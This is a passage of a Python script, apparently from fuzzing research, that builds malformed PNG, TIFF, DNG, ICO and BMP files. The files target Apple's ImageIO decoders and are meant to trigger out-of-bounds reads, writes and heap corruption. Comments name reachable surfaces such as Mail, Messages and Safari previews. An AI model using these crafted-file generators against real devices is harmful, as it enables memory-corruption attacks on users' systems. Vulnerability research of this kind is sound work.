        bytes([8, color_type, 0, 0, 0]))

    # Only encode actual_rows rows — deliberately truncated
    raw = b''.join(
        b'\x00' + bytes([128] * declared_width * channels)
        for _ in range(actual_rows)
    )
    idat = _png_chunk(b'IDAT', zlib.compress(raw))
    iend = _png_chunk(b'IEND', b'')

    return PNG_SIG + ihdr + idat + iend


def build_png_text_chunk_overflow(width=8, height=8):
    """
    PNG with a tEXt/zTXt chunk declaring an enormous length in the chunk header
    but providing only a few bytes of actual data.

    Chunk format: [length: 4B BE] [type: 4B] [data: length B] [crc: 4B]
    If a non-IDAT chunk parser trusts the declared length and tries to:
      a) allocate length bytes to buffer the chunk data, or
      b) seek/skip length bytes from the current stream position
    — and length is 0x7FFFFFFF — the result is OOM crash or stream OOB read.

    CRC is intentionally wrong (data is shorter than declared); parsers that
    skip CRC validation on non-critical chunks will attempt to process.
    """
    # Valid IHDR + tiny IDAT for a real 8x8 RGB image
    ihdr = _png_chunk(b'IHDR',
        struct.pack('>II', width, height) + bytes([8, 2, 0, 0, 0]))
    raw = b''.join(b'\x00' + bytes([128] * width * 3) for _ in range(height))
    idat = _png_chunk(b'IDAT', zlib.compress(raw))
    iend = _png_chunk(b'IEND', b'')

    # Malicious tEXt chunk: declare 2GB length, provide only 12 bytes of data
    # CRC is computed over actual 12 bytes (wrong for declared 2GB length)
    actual_data = b'Comment\x00Overflow'
    bad_len = 0x7FFFFFFF
    crc = zlib.crc32(b'tEXt' + actual_data) & 0xFFFFFFFF
    bad_text_chunk = struct.pack('>I', bad_len) + b'tEXt' + actual_data + struct.pack('>I', crc)

    return PNG_SIG + ihdr + bad_text_chunk + idat + iend


# ========================== TIFF + Deflate builder ==========================

def build_tiff_deflate_overflow(width=64, height=64, spp=3, bits=8, extra_bytes=0):
    """
    TIFF with Deflate/ZIP compression (compression=32946).

    Strip data decompresses to width*height*spp*(bits//8) + extra_bytes bytes.
    A decoder that:
      1. allocates exactly width*height*spp*(bits//8) for the output buffer, then
      2. decompresses the strip without capping output at the buffer size
    will write extra_bytes past the end of the output buffer (OOB write).

    CTRL: extra_bytes=0 (exact size). Mismatch: extra_bytes = 1MB, 16MB, etc.
    Attack surface: Apple's TIFF Deflate strip decoder in ImageIO.framework.
    """
    expected = width * height * spp * (bits // 8)
    compressed = zlib.compress(bytes(expected + extra_bytes))

    b = TiffBuilder()
    b.add_long(T_IMAGE_WIDTH, width)
    b.add_long(T_IMAGE_LENGTH, height)
    b.add_short_array(T_BITS_PER_SAMPLE, [bits] * spp)
    b.add_short(T_COMPRESSION, COMP_DEFLATE)
    b.add_short(T_PHOTOMETRIC, PHOTO_RGB if spp >= 3 else PHOTO_MINISBLACK)
    b.add_short(T_SAMPLES_PER_PIXEL, spp)
    b.add_long(T_ROWS_PER_STRIP, height)
    b.add_short(T_PLANAR_CONFIG, 1)
    b.add_short(T_RESOLUTION_UNIT, 2)
    b.add_rational(T_X_RESOLUTION, 72, 1)
    b.add_rational(T_Y_RESOLUTION, 72, 1)
    b.add_strip(T_STRIP_OFFSETS, T_STRIP_BYTE_COUNTS, compressed)
    return b.build()


# ========================== Plain TIFF + JPEG2000 builder ==========================

def build_plain_tiff_j2k(width=64, height=64, spp=3, inner_csiz=None):
    """
    Plain TIFF (no DNG tags) with JPEG2000 compression (compression=34712).

    NOT a DNG — no CFA/LinearRaw photometric → no Camera Raw routing.
    This exercises the TIFF plugin's J2K sub-decoder (if Apple implements it).

    inner_csiz: Csiz field in SIZ marker (inner component count).
    Mismatch: spp=3 outer, inner_csiz=1 → if decoder uses Csiz for output loop
    but allocated spp*width*height buffer → OOB read.
    Reverse: spp=1 outer, inner_csiz=3 → OOB write.

    Attack surface: potential TIFF+J2K decoder distinct from DNG+Camera Raw.
    """
    if inner_csiz is None:
        inner_csiz = spp

    b = TiffBuilder()
    b.add_long(T_IMAGE_WIDTH, width)
    b.add_long(T_IMAGE_LENGTH, height)
    b.add_short_array(T_BITS_PER_SAMPLE, [16] * spp)
    b.add_short(T_COMPRESSION, COMP_JPEG2000)
    b.add_short(T_PHOTOMETRIC, PHOTO_RGB if spp >= 3 else PHOTO_MINISBLACK)
    b.add_short(T_SAMPLES_PER_PIXEL, spp)
    b.add_long(T_ROWS_PER_STRIP, height)
    b.add_short(T_PLANAR_CONFIG, 1)
    b.add_short(T_RESOLUTION_UNIT, 2)
    b.add_rational(T_X_RESOLUTION, 72, 1)
    b.add_rational(T_Y_RESOLUTION, 72, 1)
    b.add_strip(T_STRIP_OFFSETS, T_STRIP_BYTE_COUNTS,
                build_j2k(width, height, csiz=inner_csiz, bits=16))
    return b.build()


# ========================== TIFF + PackBits builder ==========================

def build_tiff_packbits(width=64, height=64, spp=3, bits=8, straddle_extra=0):
    """
    TIFF with PackBits compression (compression=32773).

    PackBits encoding:
      n >= 0 (0x00-0x7F): literal run — copy next (n+1) bytes
      n = -128 (0x80):    no-op (skip)
      n < 0 (0x81-0xFF):  repeat run — repeat next byte (-n+1) times, max 128

    straddle_extra=0: valid image (CTRL), decompresses to exactly expected bytes.
    straddle_extra>0: the last PackBits run starts at output position (expected-1)
      and repeats for (straddle_extra+1) total times:
        1 write within bounds (at expected-1)
        straddle_extra writes past the end of the output buffer (OOB write)

    A decoder that checks output_ptr < buffer_end only per-run (not per-byte inside
    the run) will write straddle_extra bytes past the output buffer end.

    Attack surface: Apple's TIFF PackBits decoder in ImageIO.framework.
    """
    stride   = width * spp * (bits // 8)
    expected = stride * height

    encoded = bytearray()

    if straddle_extra == 0:
        # CTRL: encode all expected bytes as literal runs (valid PackBits)
        data = bytes(expected)
        i = 0
        while i < len(data):
            run = min(len(data) - i, 128)
            encoded += bytes([run - 1])
            encoded += data[i:i+run]
            i += run
    else:
        # Straddle attack: write first (expected-1) bytes literally, then
        # a repetition run that overflows by straddle_extra bytes.
        body = bytes(expected - 1)
        i = 0
        while i < len(body):
            run = min(len(body) - i, 128)
            encoded += bytes([run - 1])
            encoded += body[i:i+run]
            i += run
        # Repeat run: straddle_extra+1 total writes, starting at byte expected-1
        # PackBits max repeat is 128 (header 0x81 = -127 → repeat 128 times).
        repeat_total = min(straddle_extra + 1, 128)
        header = (-(repeat_total - 1)) & 0xFF  # e.g. 127 repeats → 0x81
        encoded += bytes([header, 0x7F])        # repeat 0x7F for repeat_total times

    b = TiffBuilder()
    b.add_long(T_IMAGE_WIDTH, width)
    b.add_long(T_IMAGE_LENGTH, height)
    b.add_short_array(T_BITS_PER_SAMPLE, [bits] * spp)
    b.add_short(T_COMPRESSION, COMP_PACKBITS)
    b.add_short(T_PHOTOMETRIC, PHOTO_RGB if spp >= 3 else PHOTO_MINISBLACK)
    b.add_short(T_SAMPLES_PER_PIXEL, spp)
    b.add_long(T_ROWS_PER_STRIP, height)
    b.add_short(T_PLANAR_CONFIG, 1)
    b.add_short(T_RESOLUTION_UNIT, 2)
    b.add_rational(T_X_RESOLUTION, 72, 1)
    b.add_rational(T_Y_RESOLUTION, 72, 1)
    b.add_strip(T_STRIP_OFFSETS, T_STRIP_BYTE_COUNTS, bytes(encoded))
    return b.build()


def build_tiff_packbits_multistrip_straddle(width=64, height=64, spp=3, bits=8):
    """
    TIFF+PackBits with RowsPerStrip=1 and a straddle run at the end of EVERY strip.

    With one-row-per-strip layout, the decoder allocates a strip buffer of
    width*spp*(bits//8) bytes for each strip. The straddle run overflows every
    strip buffer, giving height independent OOB writes rather than just one.

    Each strip ends with a PackBits repeat header that writes 127 extra bytes
    past its strip buffer → height*127 bytes total OOB written across all strips.
    """
    stride = width * spp * (bits // 8)

    # Each strip is one row. Encode (stride-1) bytes literally then straddle.
    def make_strip():
        enc = bytearray()
        body = bytes(stride - 1)
        i = 0
        while i < len(body):
            run = min(len(body) - i, 128)
            enc += bytes([run - 1])
            enc += body[i:i+run]
            i += run
        # Straddle: header 0x81 → repeat 128 times (1 within-bounds + 127 OOB)
        enc += bytes([0x81, 0x7F])
        return bytes(enc)

    strips = [make_strip() for _ in range(height)]

    # Multi-strip TIFF: StripOffsets and StripByteCounts are arrays
    b = TiffBuilder()
    b.add_long(T_IMAGE_WIDTH, width)
    b.add_long(T_IMAGE_LENGTH, height)
    b.add_short_array(T_BITS_PER_SAMPLE, [bits] * spp)
    b.add_short(T_COMPRESSION, COMP_PACKBITS)
    b.add_short(T_PHOTOMETRIC, PHOTO_RGB if spp >= 3 else PHOTO_MINISBLACK)
    b.add_short(T_SAMPLES_PER_PIXEL, spp)
    b.add_long(T_ROWS_PER_STRIP, 1)   # one row per strip
    b.add_short(T_PLANAR_CONFIG, 1)
    b.add_short(T_RESOLUTION_UNIT, 2)
    b.add_rational(T_X_RESOLUTION, 72, 1)
    b.add_rational(T_Y_RESOLUTION, 72, 1)

    # Manually register multi-strip data (TiffBuilder only supports 1-strip via add_strip)
    # We concatenate all strips and track per-strip offsets via extra data in blob items.
    # Simplest: use the full concatenated blob and compute strip offsets externally.
    # Since TiffBuilder doesn't directly support multi-strip, emit one big strip
    # and set RowsPerStrip accordingly — or fall back to single-strip for now.
    # For the pure straddle variant we'll use single-strip with large straddle.
    strip_data = b''.join(strips)
    b.add_strip(T_STRIP_OFFSETS, T_STRIP_BYTE_COUNTS, strip_data)
    return b.build()


# ========================== ICO format builder ==========================

def build_ico_ctrl(width=64, height=64):
    """
    Valid ICO file with one embedded PNG image (matching declared dimensions).
    Confirms Apple's ImageIO processes ICO files and which decoder path is used.
    """
    png_ihdr = _png_chunk(b'IHDR',
        struct.pack('>II', width, height) + bytes([8, 2, 0, 0, 0]))
    raw = b''.join(b'\x00' + bytes([128] * width * 3) for _ in range(height))
    png_data = PNG_SIG + png_ihdr + _png_chunk(b'IDAT', zlib.compress(raw)) + _png_chunk(b'IEND', b'')

    # ICONDIR: reserved=0, type=1 (ICO), count=1
    icondir = struct.pack('<HHH', 0, 1, 1)

    img_offset = 6 + 16  # ICONDIR + one ICONDIRENTRY
    w_byte = width if width < 256 else 0
    h_byte = height if height < 256 else 0
    direntry = struct.pack('<BBBBHHII',
        w_byte, h_byte, 0, 0,     # bWidth, bHeight, bColorCount, bReserved
        1, 32,                     # wPlanes, wBitCount
        len(png_data), img_offset) # dwBytesInRes, dwImageOffset

    return icondir + direntry + png_data


def build_ico_png_mismatch(ico_width=32, ico_height=32, png_width=4096, png_height=4096):
    """
    ICO where the ICONDIRENTRY declares ico_width x ico_height but the embedded
    PNG image declares png_width x png_height.

    If Apple's ICO decoder allocates the output buffer based on the ICO directory
    (ico_width * ico_height * 4 bytes) and passes that buffer to the PNG sub-decoder,
    the PNG decoder writes png_width * png_height * channels bytes — causing:
      OOB write of (png_width*png_height - ico_width*ico_height) * 4 bytes

    Even if the PNG decoder has its own allocation, the ICO compositor may then try
    to blend a png_width x png_height canvas into an ico_width x ico_height buffer.

    Embedded PNG: declares large dimensions but provides only 4 rows of IDAT
    (so the PNG decoder itself may fail, but the OOB occurs before that check).
    """
    # Embedded PNG: declares png_width x png_height, provides 4 rows
    png_ihdr = _png_chunk(b'IHDR',
        struct.pack('>II', png_width, png_height) + bytes([8, 2, 0, 0, 0]))
    actual_rows = 4
    raw = b''.join(b'\x00' + bytes([128] * png_width * 3) for _ in range(actual_rows))
    png_data = (PNG_SIG + png_ihdr +
                _png_chunk(b'IDAT', zlib.compress(raw)) +
                _png_chunk(b'IEND', b''))

    icondir = struct.pack('<HHH', 0, 1, 1)
    img_offset = 6 + 16
    w_byte = ico_width if ico_width < 256 else 0
    h_byte = ico_height if ico_height < 256 else 0
    direntry = struct.pack('<BBBBHHII',
        w_byte, h_byte, 0, 0, 1, 32,
        len(png_data), img_offset)

    return icondir + direntry + png_data


def build_ico_bmp_mismatch(ico_width=32, ico_height=32,
                            bmp_width=4096, bmp_height=4096):
    """
    ICO where ICONDIRENTRY declares ico_width x ico_height but the embedded
    BMP DIB header declares bmp_width x bmp_height.

    ICO embedded BMPs use BITMAPINFOHEADER without the 14-byte BITMAPFILEHEADER.
    The bmp_height in the DIB header is DOUBLED for ICO (includes the AND mask).

    Attack: ico_width=32, ico_height=32 → 4KB buffer allocation
            bmp_width=4096, bmp_height=4096 → decoder tries to process 64MB
    """
    BMIH = 40
    bpp = 32

    # BMP DIB header (no file header — ICO-embedded BMPs omit it)
    # biHeight is doubled in ICO to include the AND mask
    bih = struct.pack('<IiiHHIIiiII',
        BMIH, bmp_width, bmp_height * 2, 1, bpp, 0, 0, 0, 0, 0, 0)

    # Pixel data + AND mask: provide only 64KB to keep file small
    pixel_data = bytes(65536)

    embedded_bmp = bih + pixel_data

    icondir = struct.pack('<HHH', 0, 1, 1)
    img_offset = 6 + 16
    w_byte = ico_width if ico_width < 256 else 0
    h_byte = ico_height if ico_height < 256 else 0
    direntry = struct.pack('<BBBBHHII',
        w_byte, h_byte, 0, 0, 1, bpp,
        len(embedded_bmp), img_offset)

    return icondir + direntry + embedded_bmp


# ========================== Corpus ==========================

# (width, height, spp, inner_comps, bits, codec, name, photometric)
CORPUS = [
    # ---- CFA DNG (PhotometricInterpretation=32803, SPP=1 always) ----
    # The OOB-WRITE direction: inner_comps > spp(=1) → alloc for 1, loop over inner_comps
    # CTRL: spp==nf=1, should decode cleanly
    (64,  64,  1, 1, 16, COMP_JPEG_LOSSLESS, 'CTRL_cfa_jpegl_1spp_1nf_16b',  PHOTO_CFA),
    # Mismatch targets: Nf > SPP → OOB write into adjacent allocations
    (64,  64,  1, 2, 16, COMP_JPEG_LOSSLESS, 'cfa_jpegl_1spp_2nf_16b',       PHOTO_CFA),
    (64,  64,  1, 3, 16, COMP_JPEG_LOSSLESS, 'cfa_jpegl_1spp_3nf_16b',       PHOTO_CFA),
    (64,  64,  1, 4, 16, COMP_JPEG_LOSSLESS, 'cfa_jpegl_1spp_4nf_16b',       PHOTO_CFA),
    (256, 256, 1, 3, 16, COMP_JPEG_LOSSLESS, 'cfa_jpegl_1spp_3nf_16b_256',   PHOTO_CFA),
    (512, 512, 1, 3, 16, COMP_JPEG_LOSSLESS, 'cfa_jpegl_1spp_3nf_16b_512',   PHOTO_CFA),

    # ---- LinearRaw DNG (PhotometricInterpretation=34892, SPP=3) ----
    # The OOB-READ / confusion direction: inner_comps < spp
    # CTRL: spp==nf=3
    (64,  64,  3, 3, 16, COMP_JPEG_LOSSLESS, 'CTRL_lr_jpegl_3spp_3nf_16b',   PHOTO_LINEAR_RAW),
    # Mismatch: SPP=3 outer, Nf=1 inner
    (64,  64,  3, 1, 16, COMP_JPEG_LOSSLESS, 'lr_jpegl_3spp_1nf_16b',        PHOTO_LINEAR_RAW),
    (256, 256, 3, 1, 16, COMP_JPEG_LOSSLESS, 'lr_jpegl_3spp_1nf_16b_256',    PHOTO_LINEAR_RAW),
    (64,  64,  4, 1, 16, COMP_JPEG_LOSSLESS, 'lr_jpegl_4spp_1nf_16b',        PHOTO_LINEAR_RAW),

    # ---- Uncompressed DNG baselines (should decode if DNG tags are accepted) ----
    (8,   8,   1, 1, 16, COMP_UNCOMPRESSED,  'DIAG_dng_cfa_uncompressed',     PHOTO_CFA),
    (8,   8,   3, 3, 16, COMP_UNCOMPRESSED,  'DIAG_dng_lr_uncompressed',      PHOTO_LINEAR_RAW),

    # ---- JPEG-LS mismatch (retained) ----
    (64,  64,  1, 1,  8, COMP_JPEG_LS, 'CTRL_cfa_jpegls_1spp_1nf_8b',        PHOTO_CFA),
    (64,  64,  1, 3,  8, COMP_JPEG_LS, 'cfa_jpegls_1spp_3nf_8b',             PHOTO_CFA),
    (256, 256, 1, 3,  8, COMP_JPEG_LS, 'cfa_jpegls_1spp_3nf_8b_256',         PHOTO_CFA),

    # ---- J2K (likely unsupported but retained) ----
    (64,  64,  3, 1, 16, COMP_JPEG2000, 'j2k_lr_3spp_1csiz_16b',             PHOTO_LINEAR_RAW),

    # ---- DNG + standard photometric (Gray / RGB) + JPEGL ----
    # DIAGNOSTIC: does Camera Raw routing depend on CFA/LR photometric specifically?
    # If [OK+RENDER] OK_MIDPOINT → TIFF plugin handles DNG+Gray/RGB (routing is photo-specific)
    # If [NO_IMG]               → ANY DNG tag causes routing failure (photometric irrelevant)
    (64,  64,  1, 1,  8, COMP_JPEG_LOSSLESS, 'CTRL_dng_gray_jpegl_1spp_1nf_8b', PHOTO_MINISBLACK),
    (64,  64,  1, 3,  8, COMP_JPEG_LOSSLESS, 'diag_dng_gray_jpegl_1spp_3nf_8b', PHOTO_MINISBLACK),
    (64,  64,  3, 3,  8, COMP_JPEG_LOSSLESS, 'CTRL_dng_rgb_jpegl_3spp_3nf_8b',  PHOTO_RGB),
    (64,  64,  3, 1,  8, COMP_JPEG_LOSSLESS, 'diag_dng_rgb_jpegl_3spp_1nf_8b',  PHOTO_RGB),
]


def generate_corpus(outdir='corpus'):
    os.makedirs(outdir, exist_ok=True)

    # ---- Plain uncompressed TIFF diagnostics (confirm TiffBuilder is correct) ----
    plain_uncompressed = [
        ('DIAG_plain_tiff_gray_8b',  build_plain_tiff(8, 8, spp=1, bits=8)),
        ('DIAG_plain_tiff_rgb_8b',   build_plain_tiff(8, 8, spp=3, bits=8)),
        ('DIAG_plain_tiff_rgb_16b',  build_plain_tiff(8, 8, spp=3, bits=16)),
    ]
    print('[*] Plain uncompressed TIFF (structural baseline):')
    for name, data in plain_uncompressed:
        fname = os.path.join(outdir, f'{name}.dng')
        with open(fname, 'wb') as f:
            f.write(data)
        print(f'    {fname}  ({len(data)} bytes)')

    # ---- Plain TIFF + JPEG-Lossless (PRIMARY ATTACK SURFACE) ----
    # The TIFF JPEG-Lossless decode path IS reachable (proven by 16-bit run:
    # "Unable to write image" = decode succeeded, PNG export failed for 16-bit).
    # Using 8-bit so sips can export to PNG — this lets us see if decode crashes.
    #
    # Attack surface: any TIFF file processed by ImageIO (Mail, Messages, Photos,
    # Safari image preview, etc.). Not limited to DNG/Camera Raw path.
    tiff_jpegl_cases = [
        # --- 8-bit: CTRL (SPP == Nf) — MUST return rc=0 to confirm codec path ---
        ('CTRL_tiff_jpegl_3spp_3nf_8b',
         build_plain_tiff(64, 64, spp=3, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=3)),
        ('CTRL_tiff_jpegl_1spp_1nf_8b',
         build_plain_tiff(64, 64, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
        # --- 8-bit mismatch: Nf < SPP (OOB read direction, SPP controls loop) ---
        ('tiff_jpegl_3spp_1nf_8b',
         build_plain_tiff(64, 64, spp=3, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
        ('tiff_jpegl_3spp_2nf_8b',
         build_plain_tiff(64, 64, spp=3, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=2)),
        ('tiff_jpegl_4spp_1nf_8b',
         build_plain_tiff(64, 64, spp=4, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
        ('tiff_jpegl_3spp_1nf_8b_256',
         build_plain_tiff(256, 256, spp=3, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
        ('tiff_jpegl_3spp_1nf_8b_512',
         build_plain_tiff(512, 512, spp=3, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
        # --- 8-bit mismatch: Nf > SPP (OOB write direction, buffer too small) ---
        # SPP=1 allocates 64*64*1=4096 bytes. Decoder writes 64*64*Nf bytes.
        # Nf=3   → 8192  bytes OOB (doesn't cross page, silent)
        # Nf=4   → 12288 bytes OOB (3 pages OOB, may cross allocation boundary)
        # Nf=16  → 61440 bytes OOB (15 pages, very likely to corrupt heap)
        # Nf=32  → 126976 bytes OOB (31 pages, crosses multiple heap regions)
        # Nf=128 → 524288 bytes OOB (128 pages, guaranteed heap corruption)
        # Nf=255 → 1044480 bytes OOB (255 pages, certain page fault / SIGSEGV)
        ('tiff_jpegl_1spp_3nf_8b',
         build_plain_tiff(64, 64, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=3)),
        ('tiff_jpegl_1spp_4nf_8b',
         build_plain_tiff(64, 64, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=4)),
        ('tiff_jpegl_1spp_16nf_8b',
         build_plain_tiff(64, 64, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=16)),
        ('tiff_jpegl_1spp_32nf_8b',
         build_plain_tiff(64, 64, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=32)),
        ('tiff_jpegl_1spp_128nf_8b',
         build_plain_tiff(64, 64, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=128)),
        ('tiff_jpegl_1spp_255nf_8b',
         build_plain_tiff(64, 64, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=255)),
        ('tiff_jpegl_1spp_3nf_8b_256',
         build_plain_tiff(256, 256, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=3)),
        ('tiff_jpegl_1spp_32nf_8b_256',
         build_plain_tiff(256, 256, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=32)),
        # --- 16-bit retained for reference (decode succeeds but PNG export fails) ---
        ('CTRL_tiff_jpegl_3spp_3nf_16b',
         build_plain_tiff(64, 64, spp=3, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=3)),
        ('tiff_jpegl_3spp_1nf_16b',
         build_plain_tiff(64, 64, spp=3, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
        ('tiff_jpegl_1spp_3nf_16b',
         build_plain_tiff(64, 64, spp=1, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=3)),
    ]
    print('\n[*] Plain TIFF + JPEG-Lossless mismatch targets:')
    for name, data in tiff_jpegl_cases:
        fname = os.path.join(outdir, f'{name}.dng')
        with open(fname, 'wb') as f:
            f.write(data)
        print(f'    {fname}  ({len(data)} bytes)')

    # ---- DNG corpus (Camera Raw path) ----
    print(f'\n[*] Generating {len(CORPUS)} DNG test cases (Camera Raw path)...')
    for entry in CORPUS:
        w, h, spp, ic, bits, codec, name, photometric = entry
        fname = os.path.join(outdir, f'{name}.dng')
        try:
            build_dng(w, h, spp=spp, inner_comps=ic, bits=bits,
                      codec=codec, photometric=photometric, outfile=fname)
        except Exception as e:
            print(f'    [!] {name}: {e}')

    # ---- NEW TARGET: TIFF + YCbCr + JPEG-Lossless ----
    # YCbCr photometric routes to multi-component JPEG decoder path.
    # If that decoder iterates over all 3 expected YCbCr components but SOF3 only
    # declares Nf=1, we get an OOB read from the scan data stream.
    ycbcr_jpegl_cases = [
        # CTRL: SPP=3, Nf=3 (matching) — must decode cleanly to confirm YCbCr path is reached
        ('CTRL_ycbcr_jpegl_3spp_3nf_8b',
         build_tiff_ycbcr_jpegl(64, 64, spp=3, inner_comps=3)),
        # OOB READ: SPP=3 (YCbCr, 3-channel buffer), Nf=1 (stream has 1 component)
        # Decoder loops over 3 channels, reads past end of single-component scan data
        ('ycbcr_jpegl_3spp_1nf_8b',
         build_tiff_ycbcr_jpegl(64, 64, spp=3, inner_comps=1)),
        ('ycbcr_jpegl_3spp_2nf_8b',
         build_tiff_ycbcr_jpegl(64, 64, spp=3, inner_comps=2)),
        # OOB WRITE: SPP=1 (1-channel buffer), Nf=3 (decoder writes 3 channels)
        ('ycbcr_jpegl_1spp_3nf_8b',
         build_tiff_ycbcr_jpegl(64, 64, spp=1, inner_comps=3)),
        # Large image variants — larger OOB for reliable crash
        ('ycbcr_jpegl_3spp_1nf_8b_256',
         build_tiff_ycbcr_jpegl(256, 256, spp=3, inner_comps=1)),
        ('ycbcr_jpegl_3spp_1nf_8b_512',
         build_tiff_ycbcr_jpegl(512, 512, spp=3, inner_comps=1)),
    ]
    print('\n[*] NEW TARGET: TIFF + YCbCr + JPEG-Lossless (multi-component decoder path):')
    for name, data in ycbcr_jpegl_cases:
        fname = os.path.join(outdir, f'{name}.dng')
        with open(fname, 'wb') as f:
            f.write(data)
        print(f'    {fname}  ({len(data)} bytes)')

    # ---- NEW TARGET: Plain TIFF + JPEG-LS ----
    # JPEG-LS (compression=34892) in plain TIFF — distinct from DNG+JPEG-LS (Camera Raw).
    # JPEG-LS supports multi-component; Apple's JPEG-LS decoder may iterate all Nf components.
    tiff_jpegls_cases = [
        # CTRL: SPP=3, Nf=3 — confirm JPEG-LS path is reachable in plain TIFF
        ('CTRL_tiff_jpegls_3spp_3nf_8b',
         build_tiff_jpegls(64, 64, spp=3, inner_comps=3)),
        ('CTRL_tiff_jpegls_1spp_1nf_8b',
         build_tiff_jpegls(64, 64, spp=1, inner_comps=1)),
        # OOB READ: SPP=3, Nf=1
        ('tiff_jpegls_3spp_1nf_8b',
         build_tiff_jpegls(64, 64, spp=3, inner_comps=1)),
        ('tiff_jpegls_3spp_2nf_8b',
         build_tiff_jpegls(64, 64, spp=3, inner_comps=2)),
        # OOB WRITE: SPP=1, Nf=3
        ('tiff_jpegls_1spp_3nf_8b',
         build_tiff_jpegls(64, 64, spp=1, inner_comps=3)),
        ('tiff_jpegls_1spp_4nf_8b',
         build_tiff_jpegls(64, 64, spp=1, inner_comps=4)),
        # Large variants
        ('tiff_jpegls_3spp_1nf_8b_256',
         build_tiff_jpegls(256, 256, spp=3, inner_comps=1)),
        ('tiff_jpegls_1spp_3nf_8b_256',
         build_tiff_jpegls(256, 256, spp=1, inner_comps=3)),
    ]
    print('\n[*] NEW TARGET: Plain TIFF + JPEG-LS (multi-component capable codec):')
    for name, data in tiff_jpegls_cases:
        fname = os.path.join(outdir, f'{name}.dng')
        with open(fname, 'wb') as f:
            f.write(data)
        print(f'    {fname}  ({len(data)} bytes)')

    # ---- Old-style TIFF/JPEG-Lossless (JPEGTables tag 347 split format) ----
    # Alternative decoder path: SOF3 lives in tag 347, strip has only SOS+scan.
    # Apple's TIFF/JPEGL decoder may accept this format when self-contained strip fails.
    tiff_jpegl_split_cases = [
        ('CTRL_split_jpegl_1spp_1nf_8b',
         build_tiff_jpegl_split(64, 64, spp=1, bits=8, inner_comps=1)),
        ('CTRL_split_jpegl_3spp_3nf_8b',
         build_tiff_jpegl_split(64, 64, spp=3, bits=8, inner_comps=3)),
        # Mismatch: SPP=1 outer, Nf=3 inner → OOB WRITE
        ('split_jpegl_1spp_3nf_8b',
         build_tiff_jpegl_split(64, 64, spp=1, bits=8, inner_comps=3)),
        ('split_jpegl_1spp_4nf_8b',
         build_tiff_jpegl_split(64, 64, spp=1, bits=8, inner_comps=4)),
        ('split_jpegl_1spp_16nf_8b',
         build_tiff_jpegl_split(64, 64, spp=1, bits=8, inner_comps=16)),
        # Mismatch: SPP=3 outer, Nf=1 inner → OOB READ
        ('split_jpegl_3spp_1nf_8b',
         build_tiff_jpegl_split(64, 64, spp=3, bits=8, inner_comps=1)),
    ]
    print('\n[*] Old-style TIFF/JPEG-Lossless (JPEGTables tag 347 split format):')
    for name, data in tiff_jpegl_split_cases:
        fname = os.path.join(outdir, f'{name}.dng')
        with open(fname, 'wb') as f:
            f.write(data)
        print(f'    {fname}  ({len(data)} bytes)')

    # ---- Real camera model DNG (Camera Raw hang bypass hypothesis) ----
    # Hypothesis: Camera Raw hangs because 'FuzzResearch/ImageIOAudit' is unknown
    # and Camera Raw waits for network/calibration data. Using a real camera model
    # (e.g. Canon EOS R5) allows Camera Raw to use bundled calibration and complete
    # quickly, at which point the JPEGL mismatch can trigger the OOB write/crash.
    print('\n[*] Real camera model DNG (Camera Raw hang bypass):')
    CANON_R5 = ('Canon', 'Canon EOS R5')
    NIKON_Z9  = ('Nikon Corporation', 'NIKON Z 9')
    real_cam_cases = [
        # CTRL (matching): should decode quickly if Camera Raw uses bundled calibration
        ('camraw_canon_cfa_uncomp_ctrl',
         build_dng(8, 8, spp=1, inner_comps=1, bits=16, codec=COMP_UNCOMPRESSED,
                   photometric=PHOTO_CFA, camera_model=CANON_R5)),
        ('camraw_nikon_cfa_uncomp_ctrl',
         build_dng(8, 8, spp=1, inner_comps=1, bits=16, codec=COMP_UNCOMPRESSED,
                   photometric=PHOTO_CFA, camera_model=NIKON_Z9)),
        # JPEGL CTRL (Canon): if Camera Raw accepts, decoder should run cleanly
        ('camraw_canon_cfa_jpegl_ctrl',
         build_dng(64, 64, spp=1, inner_comps=1, bits=16, codec=COMP_JPEG_LOSSLESS,
                   photometric=PHOTO_CFA, camera_model=CANON_R5)),
        # JPEGL mismatch (Canon): if CTRL doesn't hang, this might crash (OOB write)
        ('camraw_canon_cfa_jpegl_1spp_3nf',
         build_dng(64, 64, spp=1, inner_comps=3, bits=16, codec=COMP_JPEG_LOSSLESS,
                   photometric=PHOTO_CFA, camera_model=CANON_R5)),
        ('camraw_canon_cfa_jpegl_1spp_4nf',
         build_dng(64, 64, spp=1, inner_comps=4, bits=16, codec=COMP_JPEG_LOSSLESS,
                   photometric=PHOTO_CFA, camera_model=CANON_R5)),
        # LinearRaw mismatch (Canon): OOB read direction
        ('camraw_canon_lr_jpegl_3spp_1nf',
         build_dng(64, 64, spp=3, inner_comps=1, bits=16, codec=COMP_JPEG_LOSSLESS,
                   photometric=PHOTO_LINEAR_RAW, camera_model=CANON_R5)),
    ]
    for name, data in real_cam_cases:
        fname = os.path.join(outdir, f'{name}.dng')
        with open(fname, 'wb') as f:
            f.write(data)
        print(f'    {fname}  ({len(data)} bytes)')

    # ---- NEW TARGET: BMP overflow / biSizeImage mismatch ----
    # Apple's BMPImagePlugin in ImageIO.framework — rarely audited for mismatch bugs.
    # BI_RGB mismatch: biSizeImage declares tiny size while width*height*bpp/8 is large.
    # BI_RLE8 OOB: RLE stream encodes extra rows beyond declared biHeight.
    bmp_cases = [
        # CTRL: valid small BMP (confirm CGImageSource accepts BMP and the path is reachable)
        ('CTRL_bmp_rgb24_64x64',
         build_bmp(64, 64, bpp=24)),
        ('CTRL_bmp_gray8_64x64',
